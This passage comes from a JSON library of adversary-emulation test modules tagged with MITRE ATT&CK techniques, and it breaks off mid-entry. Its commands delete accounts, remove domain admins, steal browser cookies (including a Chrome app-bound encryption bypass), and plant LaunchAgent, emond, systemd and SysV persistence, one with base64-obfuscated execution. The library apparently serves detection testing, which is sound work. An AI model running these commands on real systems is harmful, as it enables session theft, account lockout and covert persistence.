        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} /delete\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "new_user_password",
          "description": "Password to use if user account must be created first",
          "type": "string",
          "default_value": "User2DeletePW!"
        },
        {
          "name": "user_account",
          "description": "User account to be deleted.",
          "type": "string",
          "default_value": "RAGLOXUser"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f21a1d7d-a62f-442a-8c3a-2440d43b19e5",
      "module_name": "Delete User - Windows"
    },
    {
      "index": 1190,
      "technique_id": "T1531",
      "technique_name": "Account Access Removal",
      "description": "This test will remove an account from the domain admins group\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord\nif((Get-ADUser #{remove_user} -Properties memberof).memberof -like \"CN=Domain Admins*\"){\n  Remove-ADGroupMember -Identity \"Domain Admins\" -Members #{remove_user} -Credential $Credential -Confirm:$False\n} else{\n    write-host \"Error - Make sure #{remove_user} is in the domain admins group\" -foregroundcolor Red\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "super_user",
          "description": "Account used to run the execution command (must include domain).",
          "type": "string",
          "default_value": "domain\\super_user"
        },
        {
          "name": "super_pass",
          "description": "super_user account password.",
          "type": "string",
          "default_value": "password"
        },
        {
          "name": "remove_user",
          "description": "Account to remove from domain admins.",
          "type": "string",
          "default_value": "remove_user"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires the Active Directory module for powershell to be installed.\n",
          "check_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n",
          "install_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"
        }
      ],
      "rx_module_id": "43f71395-6c37-498e-ab17-897d814a0947",
      "module_name": "Remove Account From Domain Admin Group"
    },
    {
      "index": 1191,
      "technique_id": "T1531",
      "technique_name": "Account Access Removal",
      "description": "This test changes the user password to hinder access to the account using passwd utility.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "passwd #{user_account} #enter admin password > enter new password > confirm new password\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user_account",
          "description": "User account whose password will be changed.",
          "type": "string",
          "default_value": "ARTUser"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3c717bf3-2ecc-4d79-8ac8-0bfbf08fbce6",
      "module_name": "Change User Password via passwd"
    },
    {
      "index": 1192,
      "technique_id": "T1531",
      "technique_name": "Account Access Removal",
      "description": "This test deletes the user account using the dscl utility.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "dscl . -delete /Users/#{user_account} #enter admin password\n",
        "elevation_required": true,
        "cleanup_command": "dscl . -create /Users/#{user_account} #enter admin password\ndscl . -create /Users/#{user_account} UserShell /bin/bash\ndscl . -create /Users/#{user_account} UniqueID 503\ndscl . -create /Users/#{user_account} NFSHomeDirectory /Users/#{user_account}\ndscl . -passwd /Users/#{user_account} #{user_password} #enter password for new user\n"
      },
      "variables": [
        {
          "name": "user_account",
          "description": "User account which will be deleted.",
          "type": "string",
          "default_value": "ARTUser"
        },
        {
          "name": "user_password",
          "description": "User password.",
          "type": "string",
          "default_value": "ARTPassword"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4d938c43-2fe8-4d70-a5b3-5bf239aa7846",
      "module_name": "Delete User via dscl utility"
    },
    {
      "index": 1193,
      "technique_id": "T1531",
      "technique_name": "Account Access Removal",
      "description": "This test deletes the user account using the sysadminctl utility.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sysadminctl -deleteUser #{user_account} #enter admin password\n",
        "elevation_required": true,
        "cleanup_command": "sysadminctl -addUser #{user_account} -fullName \"#{user_name}\" -password #{user_password}\n"
      },
      "variables": [
        {
          "name": "user_account",
          "description": "User account which will be deleted.",
          "type": "string",
          "default_value": "ARTUserAccount"
        },
        {
          "name": "user_name",
          "description": "New user name.",
          "type": "string",
          "default_value": "ARTUser"
        },
        {
          "name": "user_password",
          "description": "New user password.",
          "type": "string",
          "default_value": "ARTPassword"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d3812c4e-30ee-466a-a0aa-07e355b561d6",
      "module_name": "Delete User via sysadminctl utility"
    },
    {
      "index": 1194,
      "technique_id": "T1531",
      "technique_name": "Account Access Removal",
      "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Connect-AzureAD\n$userprincipalname = \"#{userprincipalname}\"\nRemove-AzureADUser -ObjectId $userprincipalname",
        "elevation_required": false,
        "cleanup_command": "N/A"
      },
      "variables": [
        {
          "name": "userprincipalname",
          "description": "User principal name (UPN) for the Azure user being deleted",
          "type": "string",
          "default_value": "raglox@yourdomain.com"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if AzureAD PowerShell module is installed",
          "check_command": "Get-InstalledModule -Name AzureAD",
          "install_command": "echo \"use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force\""
        },
        {
          "description": "Check if AzureAD PowerShell module is installed",
          "check_command": "Update the input arguments so the userprincipalname value is accurate for your environment",
          "install_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""
        }
      ],
      "rx_module_id": "4f577511-dc1c-4045-bcb8-75d2457f01f4",
      "module_name": "Azure AD - Delete user via Azure AD PowerShell"
    },
    {
      "index": 1195,
      "technique_id": "T1531",
      "technique_name": "Account Access Removal",
      "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "az login\n$userprincipalname = \"#{userprincipalname}\"\naz ad user delete --id $userprincipalname",
        "elevation_required": false,
        "cleanup_command": "N/A"
      },
      "variables": [
        {
          "name": "userprincipalname",
          "description": "User principal name (UPN) for the Azure user being deleted",
          "type": "string",
          "default_value": "raglox@yourdomain.com"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if Azure CLI is installed and install manually",
          "check_command": "az account list",
          "install_command": "echo \"use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows\""
        },
        {
          "description": "Check if Azure CLI is installed and install via PowerShell",
          "check_command": "az account list",
          "install_command": "echo \"use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\\AzureCLI.msi\""
        },
        {
          "description": "Update the userprincipalname to meet your requirements",
          "check_command": "Update the input arguments so the userprincipalname value is accurate for your environment",
          "install_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""
        }
      ],
      "rx_module_id": "c955c1c7-3145-4a22-af2d-63eea0d967f0",
      "module_name": "Azure AD - Delete user via Azure CLI"
    },
    {
      "index": 1196,
      "technique_id": "T1539",
      "technique_name": "Steal Web Session Cookie",
      "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c #{sqlite3_path} \"$CookieDBLocation\" | out-file -filepath \"#{output_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "sqlite3_path",
          "description": "Path to sqlite3",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
        },
        {
          "name": "output_file",
          "description": "Filepath to output cookies",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Sqlite3 must exist at (#{sqlite3_path})\n",
          "check_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -force\n"
        }
      ],
      "rx_module_id": "4b437357-f4e9-4c84-9fa6-9bcee6f826aa",
      "module_name": "Steal Firefox Cookies (Windows)"
    },
    {
      "index": 1197,
      "technique_id": "T1539",
      "technique_name": "Steal Web Session Cookie",
      "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c #{sqlite3_path} \"#{cookie_db}\" | out-file -filepath \"#{output_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_file}\n"
      },
      "variables": [
        {
          "name": "cookie_db",
          "description": "Filepath for Chrome cookies database",
          "type": "string",
          "default_value": "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
        },
        {
          "name": "sqlite3_path",
          "description": "Path to sqlite3",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
        },
        {
          "name": "output_file",
          "description": "Filepath to output cookies",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Sqlite3 must exist at (#{sqlite3_path})\n",
          "check_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -force\n"
        }
      ],
      "rx_module_id": "26a6b840-4943-4965-8df5-ef1f9a282440",
      "module_name": "Steal Chrome Cookies (Windows)"
    },
    {
      "index": 1198,
      "technique_id": "T1539",
      "technique_name": "Steal Web Session Cookie",
      "description": "The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.\n\nIf successful, this test will output a list of cookies.\n\nNote: Chrome processes will be killed during this test.\n\nSee https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337",
        "elevation_required": false,
        "cleanup_command": "rm -rf /tmp/WhiteChocolateMacademiaNut"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Install Go",
          "check_command": "go version",
          "install_command": "brew install go"
        },
        {
          "description": "Download and compile WhiteChocolateMacademiaNut",
          "check_command": "/tmp/WhiteChocolateMacademiaNut/chocolate -h",
          "install_command": "git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut\ncd /tmp/WhiteChocolateMacademiaNut\ngo mod init chocolate\ngo mod tidy\ngo build"
        }
      ],
      "rx_module_id": "e43cfdaf-3fb8-4a45-8de0-7eee8741d072",
      "module_name": "Steal Chrome Cookies via Remote Debugging (Mac)"
    },
    {
      "index": 1199,
      "technique_id": "T1539",
      "technique_name": "Steal Web Session Cookie",
      "description": "Chrome v127+ uses app-bound encryption to protect cookies. This test bypasses that protection to obtain the cookies. If successful, the test outputs cookie values to the console.\nNote: Will stop any instances of Chrome already running\nAdapted from https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$devToolsPort = 9222\n$testUrl = \"https://www.google.com\"\nstop-process -name \"chrome\" -force -erroraction silentlycontinue\n$chromeProcess = Start-Process \"chrome.exe\" \"$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default\" -PassThru\nStart-Sleep 10\n$jsonResponse = Invoke-WebRequest \"http://localhost:$devToolsPort/json\" -UseBasicParsing\n$devToolsPages = ConvertFrom-Json $jsonResponse.Content\n$ws_url = $devToolsPages[0].webSocketDebuggerUrl\n$ws = New-Object System.Net.WebSockets.ClientWebSocket\n$uri = New-Object System.Uri($ws_url)\n$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()\n$GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'\n$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)\n$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length\n$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()\n$completeMessage = New-Object System.Text.StringBuilder\ndo {\n    $receivedBuffer = New-Object byte[] 2048\n    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length\n    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result\n    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)\n    $completeMessage.Append($receivedString)\n} while (-not $result.EndOfMessage)\n$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, \"Closing\", [System.Threading.CancellationToken]::None).Wait()\ntry {\n    $response = ConvertFrom-Json $completeMessage.ToString()\n    $cookies = $response.result.cookies\n} catch {\n    Write-Host \"Error parsing JSON data.\"\n}\nWrite-Host $cookies\nStop-Process $chromeProcess -Force",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b647f4ee-88de-40ac-9419-f17fac9489a7",
      "module_name": "Steal Chrome v127+ cookies via Remote Debugging (Windows)"
    },
    {
      "index": 1200,
      "technique_id": "T1539",
      "technique_name": "Steal Web Session Cookie",
      "description": "This command will copy Safari BinaryCookies files using AppleScript as seen in RAGLOX Stealer.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"#{destination_path}\"' -e 'set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")' -e 'duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",
        "elevation_required": false,
        "cleanup_command": "rm \"#{destination_path}/Cookies.binarycookies\""
      },
      "variables": [
        {
          "name": "destination_path",
          "description": "Specify the path to copy the BinaryCookies file into.",
          "type": "path",
          "default_value": "/private/tmp"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e57ba07b-3a33-40cd-a892-748273b9b49a",
      "module_name": "Copy Safari BinaryCookies files using AppleScript"
    },
    {
      "index": 1201,
      "technique_id": "T1542.001",
      "technique_name": "Pre-OS Boot: System Firmware",
      "description": "Creates Wpbbin.exe in %systemroot%. This technique can be used for UEFI-based pre-OS boot persistence mechanisms.\n- https://grzegorztworek.medium.com/using-uefi-to-inject-executable-files-into-bitlocker-protected-drives-8ff4ca59c94c\n- http://download.microsoft.com/download/8/a/2/8a2fb72d-9b96-4e2d-a559-4a27cf905a80/windows-platform-binary-table.docx\n- https://github.com/tandasat/WPBT-Builder\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "echo \"Creating %systemroot%\\wpbbin.exe\"      \nNew-Item -ItemType File -Path \"$env:SystemRoot\\System32\\wpbbin.exe\"\n",
        "elevation_required": true,
        "cleanup_command": "echo \"Removing %systemroot%\\wpbbin.exe\" \nRemove-Item -Path \"$env:SystemRoot\\System32\\wpbbin.exe\"\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b8a49f03-e3c4-40f2-b7bb-9e8f8fdddbf1",
      "module_name": "UEFI Persistence via Wpbbin.exe File Creation"
    },
    {
      "index": 1202,
      "technique_id": "T1543.001",
      "technique_name": "Create or Modify System Process: Launch Agent",
      "description": "Create a plist and execute it\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\n",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}\nsudo rm ~/Library/LaunchAgents/#{plist_filename}\n"
      },
      "variables": [
        {
          "name": "plist_filename",
          "description": "filename",
          "type": "string",
          "default_value": "com.raglox.plist"
        },
        {
          "name": "path_malicious_plist",
          "description": "Name of file to store in cron folder",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1543.001/src/raglox_T1543_001.plist"
        }
      ],
      "prerequisites": [
        {
          "description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
          "check_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"The shared library doesn't exist. Check the path\"; exit 1;\n"
        }
      ],
      "rx_module_id": "a5983dee-bf6c-4eaf-951c-dbc1a7b90900",
      "module_name": "Launch Agent"
    },
    {
      "index": 1203,
      "technique_id": "T1543.001",
      "technique_name": "Create or Modify System Process: Launch Agent",
      "description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo cp #{script_location} #{script_destination}\nsudo touch /private/var/db/emondClients/#{empty_file}\n",
        "elevation_required": true,
        "cleanup_command": "sudo rm #{script_destination}\nsudo rm /private/var/db/emondClients/#{empty_file}"
      },
      "variables": [
        {
          "name": "script_location",
          "description": "evil plist location",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder/T1543.001/src/raglox_T1543_001.plist"
        },
        {
          "name": "script_destination",
          "description": "Path where to move the evil plist",
          "type": "path",
          "default_value": "/etc/emond.d/rules/raglox_T1543_001.plist"
        },
        {
          "name": "empty_file",
          "description": "Random name of the empty file used to trigger emond service",
          "type": "string",
          "default_value": "randomflag"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "11979f23-9b9d-482a-9935-6fc9cd022c3e",
      "module_name": "Event Monitor Daemon Persistence"
    },
    {
      "index": 1204,
      "technique_id": "T1543.001",
      "technique_name": "Create or Modify System Process: Launch Agent",
      "description": "Create a plist and execute it\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo cp #{path_malicious_plist} /Library/LaunchAgents/#{plist_filename}\nlaunchctl load -w /Library/LaunchAgents/#{plist_filename}\n",
        "elevation_required": true,
        "cleanup_command": "launchctl unload /Library/LaunchAgents/#{plist_filename}\nsudo rm /Library/LaunchAgents/#{plist_filename}\nsudo rm /tmp/T1543_001_raglox.txt\n"
      },
      "variables": [
        {
          "name": "plist_filename",
          "description": "filename",
          "type": "string",
          "default_value": "com.raglox.T1543.001.plist"
        },
        {
          "name": "path_malicious_plist",
          "description": "Name of file to store in cron folder",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1543.001/src/raglox_T1543_001.plist"
        }
      ],
      "prerequisites": [
        {
          "description": "/Library/LaunchAgents must exist\n",
          "check_command": "if [ ! -d /Library/LaunchAgents ]; then mkdir /Library/LaunchAgents; exit 0; fi;\n",
          "install_command": "echo \"Failed to create /Library/LaunchAgents\"; exit 1;\n"
        },
        {
          "description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
          "check_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
        }
      ],
      "rx_module_id": "66774fa8-c562-4bae-a58d-5264a0dd9dd7",
      "module_name": "Launch Agent - Root Directory"
    },
    {
      "index": 1205,
      "technique_id": "T1543.002",
      "technique_name": "Create or Modify System Process: SysV/Systemd Service",
      "description": "This test creates a Systemd service unit file and enables it as a service.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=RAGLOX Threat Library Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n",
        "elevation_required": true,
        "cleanup_command": "systemctl stop #{systemd_service_file}\nsystemctl disable #{systemd_service_file}\nrm -rf #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\n"
      },
      "variables": [
        {
          "name": "systemd_service_path",
          "description": "Path to systemd service unit file",
          "type": "path",
          "default_value": "/etc/systemd/system"
        },
        {
          "name": "systemd_service_file",
          "description": "File name of systemd service unit file",
          "type": "string",
          "default_value": "art-systemd-service.service"
        },
        {
          "name": "execstoppost_action",
          "description": "ExecStopPost action for Systemd service",
          "type": "string",
          "default_value": "/bin/touch /tmp/art-systemd-execstoppost-marker"
        },
        {
          "name": "execreload_action",
          "description": "ExecReload action for Systemd service",
          "type": "string",
          "default_value": "/bin/touch /tmp/art-systemd-execreload-marker"
        },
        {
          "name": "execstart_action",
          "description": "ExecStart action for Systemd service",
          "type": "string",
          "default_value": "/bin/touch /tmp/art-systemd-execstart-marker"
        },
        {
          "name": "execstop_action",
          "description": "ExecStop action for Systemd service",
          "type": "string",
          "default_value": "/bin/touch /tmp/art-systemd-execstop-marker"
        },
        {
          "name": "execstartpre_action",
          "description": "ExecStartPre action for Systemd service",
          "type": "string",
          "default_value": "/bin/touch /tmp/art-systemd-execstartpre-marker"
        },
        {
          "name": "execstartpost_action",
          "description": "ExecStartPost action for Systemd service",
          "type": "string",
          "default_value": "/bin/touch /tmp/art-systemd-execstartpost-marker"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d9e4f24f-aa67-4c6e-bcbf-85622b697a7c",
      "module_name": "Create Systemd Service"
    },
    {
      "index": 1206,
      "technique_id": "T1543.002",
      "technique_name": "Create or Modify System Process: SysV/Systemd Service",
      "description": "This test creates a SysV service unit file and enables it as a service.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '#\\!/bin/sh' > #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '#' >> #{rc_service_path}/#{rc_service_file}\necho '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}\necho '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}\necho '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho 'name=\"art_test\"' >> #{rc_service_path}/#{rc_service_file}\necho 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}\necho 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}\necho 'command=\"/usr/bin/touch\"' >> #{rc_service_path}/#{rc_service_file}\necho 'start_cmd=\"art_test_start\"' >> #{rc_service_path}/#{rc_service_file}\necho '' >> #{rc_service_path}/#{rc_service_file}\necho 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     \necho '{' >> #{rc_service_path}/#{rc_service_file}\necho '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}\necho '}' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}     \necho 'run_rc_command \"$1\"' >> #{rc_service_path}/#{rc_service_file}\nchmod +x #{rc_service_path}/#{rc_service_file}\nservice art-test enable\nservice art-test start\n",
        "elevation_required": true,
        "cleanup_command": "sysrc -x art_test_enable\nrm -f #{rc_service_path}/#{rc_service_file}\n"
      },
      "variables": [
        {
          "name": "rc_service_path",
          "description": "Path to rc service file",
          "type": "path",
          "default_value": "/usr/local/etc/rc.d"
        },
        {
          "name": "rc_service_file",
          "description": "File name of rc service file",
          "type": "string",
          "default_value": "art-test"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "760fe8d2-79d9-494f-905e-a239a3df86f6",
      "module_name": "Create SysV Service"
    },
    {
      "index": 1207,
      "technique_id": "T1543.002",
      "technique_name": "Create or Modify System Process: SysV/Systemd Service",
      "description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "echo \"#!/bin/bash\" > /etc/init.d/T1543.002\necho \"### BEGIN INIT INFO\" >> /etc/init.d/T1543.002\necho \"# Provides : RX Module T1543.002\" >> /etc/init.d/T1543.002\necho \"# Required-Start: \\$all\" >> /etc/init.d/T1543.002\necho \"# Required-Stop : \" >> /etc/init.d/T1543.002\necho \"# Default-Start: 2 3 4 5\" >> /etc/init.d/T1543.002\necho \"# Default-Stop: \" >> /etc/init.d/T1543.002\necho \"# Short Description: RX Module for Systemd Service Creation\" >> /etc/init.d/T1543.002\necho \"### END INIT INFO\" >> /etc/init.d/T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \\\" \" >> /etc/init.d/T1543.002\nchmod +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi\nsystemctl enable T1543.002\nsystemctl start T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a 